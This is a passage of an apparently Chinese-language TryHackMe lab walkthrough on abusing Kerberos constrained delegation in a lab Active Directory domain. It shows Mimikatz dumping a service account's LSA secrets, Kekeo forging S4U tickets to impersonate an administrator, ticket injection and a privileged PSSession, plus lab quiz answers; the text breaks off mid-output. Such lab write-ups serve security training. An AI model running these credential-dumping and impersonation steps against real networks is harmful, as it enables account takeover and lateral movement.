<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt; C:\Tools\mimikatz_trunk\x64\mimikatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;       Vincent LE TOUX             (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # token::elevate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Token Id  : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User name :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID name  : NT AUTHORITY\SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # lsadump::secrets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain : THMWRK1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SysKey : redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local name : THMWRK1 (S-1-5-21-3226461851-763325627-4205969673)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain name : ZA (S-1-5-21-3885271727-2693558621-2658995185)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain FQDN : za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Policy subsystem is : 1.18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : $MACHINE.ACC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/text: redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NTLM:redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SHA1:redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/text: redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NTLM:redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SHA1:redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : DefaultPassword</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/text: redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/text: redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : _SC_thmwinauth / service &#x27;thmwinauth&#x27; with username : svcIIS@za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/text: redacted</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>让我们来运行这两个命令：</p>
<ul>
<li><code>token::elevate</code> - 为了从注册表中 dump 出秘密，我们需要冒充 SYSTEM 用户。</li>
<li><code>lsadump::secrets</code> - Mimikatz 与注册表进行交互以提取明文凭据。</li>
</ul>
<p>现在我们可以访问与 svcIIS 账户关联的密码，我们可以执行 Kerberos 委派攻击。我们将使用 <a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener noreferrer">Kekeo</a> 和 <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener noreferrer">Mimikatz</a> 的组合。你可以在 Mimikatz 中使用另一个窗口，但确保在 token::elevate 命令之后退出 Mimikatz，否则后续加载的票证会在错误的上下文中。我们将使用 Kekeo 生成我们的票证，然后使用 Mimikatz 将这些票证加载到内存中。让我们首先生成票证：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; C:\Tools\kekeo\x64\kekeo.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> /   (&#x27;&gt;-&quot;A La Vie, A L&#x27;Amour&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> | K  |    /* * *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> \____/     Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                             with 10 modules * * */</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kekeo #</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>首先，我们需要生成一个 TGT，用于生成 HTTP 和 WSMAN 服务的票证：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Kekeo</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Realm        : za.tryhackme.loc (za)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User         : svcIIS (svcIIS)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Need PAC     : Yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt): 43460d636f269c709b20049cee36ae7a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] addr: 172.31.1.101 (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>参数解释：</p>
<ul>
<li><code>user</code> - 具有受限委派权限的用户。</li>
<li><code>domain</code> - 我们正在攻击的域，因为 Kekeo 可以用来伪造票证以滥用跨域信任。</li>
<li><code>password</code> - 与 svcIIS 账户相关联的密码。</li>
</ul>
<p>现在我们有了可以执行委派的账户的 TGT，我们可以伪造 TGS 请求以冒充我们想要模拟的账户。我们需要为 HTTP 和 WSMAN 都执行这个操作，以允许我们在 THMSERVER1 上创建一个 PSSession：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Kekeo</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [krb-cred]     E: [00000012] aes256_hmac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [s4u2self] t1_trevor.jones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] addr: 172.31.1.101 (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service(s):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>参数解释：</p>
<ul>
<li><code>tgt</code> - 我们在上一步中生成的 TGT。</li>
<li><code>user</code> - 我们想要冒充的用户。由于 t2_账户在工作站上具有管理访问权限，可以合理推断 t1_账户将具有服务器的管理访问权限，因此选择一个你想要冒充的 t1_账户。</li>
<li><code>service</code> - 我们想要使用委派冒充的服务。首先为 HTTP 服务生成一个 TGS。然后，我们可以再次运行相同的命令为 WSMAN 服务生成 TGS。</li>
</ul>
<p>再次运行命令，这次为 WSMAN 服务。现在我们有了这两个 TGS 票证，我们可以使用 Mimikatz 来导入它们：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Mimikatz</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege &#x27;20&#x27; OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;: OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;: OK</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>你可以退出 Mimikatz 并运行 klist 来验证票证是否已导入。现在票证已经导入，我们终于可以在 THMSERVER1 上创建我们的 PSSession 了：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Bye!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:&gt; New-PSSession -ComputerName thmserver1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> -- ----            ------------    ------------    -----         -----------------     ------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  1 WinRM1          thmserver1.z... RemoteMachine   Opened        Microsoft.PowerShell     Available</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents&gt; whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">za\t1_trevor.jones</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>通过利用了受限委派，现在我们拥有了对 THMSERVER1 的特权访问！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>哪种 Kerberos 委派类型允许委派所有服务？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Unconstrained Delegation</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪种 Kerberos 委派类型允许服务指定谁可以委派给它？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Resource-Based Constrained Delegation</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个约束委派服务允许通过委派访问系统的文件系统？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CIFS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>THMSERVER1 上管理员用户的桌面目录中存储的标志值 (flag2.txt) 是多少？</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 具体操作步骤 </summary><div><div class="collapsibleContent_i85q"><p>首先，SSH 连接入口点靶机</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>导入相关模块后，查看特权用户：</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\t2_melanie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">davies&gt; </span><span class="token function" style="color:#d73a49">Import-Module</span><span class="token plain"> C:\Tools\PowerView</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\Users\t2_melanie</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">davies&gt; </span><span class="token function" style="color:#d73a49">Get-NetUser</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">TrustedToAuth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">logoncount               : 39</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">badpasswordtime          : 12/12/2023 10:16:56 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedname        : CN=IIS Server</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">CN=Users</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=za</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectclass              : </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">top</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> person</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> organizationalPerson</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> user</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">displayname              : IIS Server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lastlogontimestamp       : 12/9/2023 10:02:26 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">userprincipalname        : svcIIS@za</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tryhackme</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name                     : IIS Server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectsid                : S-1-5-21-3885271727-2693558621-2658995185-6155</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">samaccountname           : svcIIS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">codepage                 : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">samaccounttype           : USER_OBJECT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">accountexpires           : NEVER</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">countrycode              : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">whenchanged              : 12/9/2023 10:02:26 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">instancetype             : 4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usncreated               : 78494</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectguid               : 11e42287-0a25-4d73-800d-b62e2d2a2a4b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sn                       : Server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lastlogoff               : 1/1/1601 12:00:00 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msds-allowedtodelegateto : </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain">WSMAN/THMSERVER1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">za</span><span class="token punctuation" style="color:#393A34">.</span><span class="token 